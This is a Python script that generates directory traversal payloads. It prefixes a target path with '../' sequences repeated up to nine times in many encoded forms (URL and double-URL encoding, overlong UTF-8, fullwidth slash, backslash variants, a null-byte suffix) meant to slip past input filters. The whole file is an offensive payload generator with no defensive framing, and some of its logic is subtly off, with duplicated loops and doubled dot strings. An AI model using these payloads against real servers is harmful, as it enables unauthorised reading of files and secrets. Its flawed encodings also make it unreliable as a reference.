p = ""

dot= ".."
slash = "/"
anti_slash= r"\/"
slash_inv_norm_url1 = "%5C%2F"
slash_inv_norm_url2 = "%255C%252F"

slash_url_2 = "%252F"

dot_slash_url1 = "%2e%2e%2f"
dot_slash_url2 = "%252e%252e%252f"
slash_binary = "%ef%bc%8f"
slash_unicode = "%c0%af"
null_byte = "%00.png" 
slash__dot = "\.."
slash__dot_inv_url1 = "%5C.."
slash__dot_inv_url2 = "%255C.."
asci_dot = "0x2e"
asci_slash = " 0x2f"
asci_slash_inv = "0x5c"

def paths_fn(p):
    paths = []
    u = "/"+p
    paths.append(u)
    
    for i in range (1,10):
        path = str((dot + slash)*i + p)
        paths.append(path)

    for i in range (1,10):
        path = str((dot*2 + slash*2)*i + p)
        paths.append(path)

    for i in range (1,10):
        path = str((dot + slash_url_2)*i + p)
        paths.append(path)

    for i in range (1,10):
        path = str((dot_slash_url1)*i + p)
        paths.append(path)

    for i in range (1,10):
        path = str((dot_slash_url2)*i + p)
        paths.append(path)
        
    for i in range (1,10):
        path = str((dot*2 + anti_slash)*i + p)
        paths.append(path)

    for i in range (1,10):
        path = str((dot + slash_binary)*i + p)
        paths.append(path)

    for i in range (1,10):
        path = str((dot*2 + slash_binary*2)*i + p)
        paths.append(path)

    for i in range (1,10):
        path = str((dot*2 + slash_binary*2)*i + p)
        paths.append(path)
        
    for i in range (1,10):
        path = str((dot + slash_unicode)*i + p)
        paths.append(path)
        
    for i in range (1,10):
        path = str((dot*2 + slash_unicode*2)*i + p)
        paths.append(path)

    for i in range (1,10):
        path = str((dot + slash)*i + p + null_byte)
        paths.append(path)
        
    for i in range (1,10):
        path = str((slash__dot)*i + p)
        paths.append(path)

    for i in range (1,10):
        path = str((slash__dot_inv_url1)*i + p)
        paths.append(path)
        
    for i in range (1,10):
        path = str((slash__dot_inv_url2)*i + p)
        paths.append(path)
        
    for i in range (1,10):
        path = str((dot + slash_inv_norm_url1 )*i + p)
        paths.append(path)
    
    for i in range (1,10):
        path = str((dot + slash_inv_norm_url2 )*i + p)
        paths.append(path)
    
    for i in range (1,10):
        path = str((dot*2 + slash_inv_norm_url1*2 )*i + p)
        paths.append(path)
    
    for i in range (1,10):
        path = str((dot*2 + slash_inv_norm_url2*2 )*i + p)
        paths.append(path)
    
    for i in range (1,10):
        path = str((asci_dot*2 + asci_slash)*i + p)
        paths.append(path)
    
    for i in range (1,10):
        path = str((asci_dot*2 + asci_slash_inv)*i + p)
        paths.append(path)
    
    for i in range (1,10):
        path = str((asci_dot*4 + asci_slash*2)*i + p)
        paths.append(path)
    
    for i in range (1,10):
        path = str((asci_dot*4 + asci_slash_inv*2)*i + p)
        paths.append(path)
    
    return paths


